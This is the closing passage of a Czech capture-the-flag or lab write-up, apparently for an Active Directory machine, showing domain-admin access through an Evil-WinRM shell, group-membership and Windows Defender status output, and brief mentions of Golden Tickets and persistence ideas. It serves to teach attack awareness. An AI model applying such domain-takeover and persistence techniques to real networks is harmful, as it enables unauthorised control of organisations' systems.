Jsme úspěšně přihlášení jako **doménový administrator** a máme veškerou kontrolu nad doménou. Dále bychom si mohli vygenerovat například **Golden Ticket**, který by nám umožnil neomezený přístup ke všem objektům domény. Mohli bychom si zajistit persistenci například vytvořením našeho nového doménového administrátora a nebo vytvořením škodlivé služby či plánované úlohy a nebo jednoduše konfigurací škodlivých registrů, ale o tom zase někdy jindy :)

Pro ověření, že máme skutečně oprávnění doménového administrátora můžeme zadat příkaz:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ===============================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                      Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
BABY\Group Policy Creator Owners            Group            S-1-5-21-1407081343-4001094062-1444647654-520 Mandatory group, Enabled by default, Enabled group
BABY\Domain Admins                          Group            S-1-5-21-1407081343-4001094062-1444647654-512 Mandatory group, Enabled by default, Enabled group
BABY\Schema Admins                          Group            S-1-5-21-1407081343-4001094062-1444647654-518 Mandatory group, Enabled by default, Enabled group
BABY\Enterprise Admins                      Group            S-1-5-21-1407081343-4001094062-1444647654-519 Mandatory group, Enabled by default, Enabled group
BABY\Denied RODC Password Replication Group Alias            S-1-5-21-1407081343-4001094062-1444647654-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level        Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

A vidíme, že jsme skutečně členem skupiny **Domain Admins**. Máme tedy kontrolu nad celou doménou.

---

## Zajímavosti
Na systému je aktivní **Windows Defender**, což vytváří mnohem reálnější prostředí. Zároveň to poukazuje na to, že útočník si mnohokrát vystačí i se základními nástroji a je schopen získat kontrolu nad celou doménou bez ohledu na aktivní antivirus. Jak sami vidíte, vystačili jsme si téměř s nástrojem **netexec** a příkazy, které jsou součástí Windows. Nepodceňujte konfiguraci AD sítí.

Získání informací o antiviru:
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus


AMEngineVersion                 : 1.1.18700.4
AMProductVersion                : 4.18.2110.6
AMRunningMode                   : Normal
AMServiceEnabled                : True
AMServiceVersion                : 4.18.2110.6
AntispywareEnabled              : True
AntispywareSignatureAge         : 1168
AntispywareSignatureLastUpdated : 11/21/2021 10:09:37 AM
AntispywareSignatureVersion     : 1.353.1377.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1168
AntivirusSignatureLastUpdated   : 11/21/2021 10:09:40 AM
AntivirusSignatureVersion       : 1.353.1377.0
BehaviorMonitorEnabled          : True
ComputerID                      : 206314CD-7391-49F2-8C0A-C6298530D7A9
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : True
IsTamperProtected               : False
IsVirtualMachine                : True
LastFullScanSource              : 0
LastQuickScanSource             : 2
NISEnabled                      : True
NISEngineVersion                : 1.1.18700.4
NISSignatureAge                 : 1168
NISSignatureLastUpdated         : 11/21/2021 10:09:40 AM
NISSignatureVersion             : 1.353.1377.0
OnAccessProtectionEnabled       : True
QuickScanAge                    : 0
QuickScanEndTime                : 2/1/2025 5:39:14 PM
QuickScanStartTime              : 2/1/2025 5:38:32 PM
RealTimeProtectionEnabled       : True
RealTimeScanDirection           : 0
TamperProtectionSource          : Signatures
TDTMode                         : N/A
TDTStatus                       : N/A
TDTTelemetry                    : N/A
PSComputerName                  :
```

Zde je vidět, že `RealTimeProtectionEnabled` je nastaveno na `True`, což znamená, že systém je chráněn antivirem v reálném čase. A teď si vemte, jak snadné to vlastně bylo. Nepotřebovali jsme napsat žádný komplexní malware ani složitě obcházet antivirus. Pouze jsme využili miskonfigurací **Active Directory** technologie a to jsme ještě ani zdaleka neobjevili vše, co může být v AD síti miskonfigurováno. 

Budu se těšit příště :)
